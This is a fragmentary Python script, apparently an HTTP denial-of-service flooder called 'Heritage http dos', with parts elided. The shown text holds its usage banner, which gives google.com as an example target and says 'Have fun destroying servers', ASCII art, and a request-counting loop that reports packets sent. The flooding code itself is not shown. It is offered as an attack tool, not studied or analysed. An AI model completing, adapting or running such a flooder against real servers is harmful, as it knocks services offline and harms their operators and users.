...
def usage():
    print('Heritage http dos - by Feciouss')
    print('')
    print('Usage: heritagehttp.py (url)')
    print('Example: heritagehttp.py http://www.google.com/')
    print('Have fun destroying servers')
    print('This tool is powerful')
    print("\a")
print( \
"""                            ,-.                               
       ___,---.__          /'|`\          __,---,___          
	...
	def run(self):
		...
		while flag==0:
			if (previous+150<request_counter) & (previous!=request_counter):
				print("[+] Successfully sent %d packets - Heritage is here to stay" % (request_counter))
				previous=request_counter
		if flag==2:
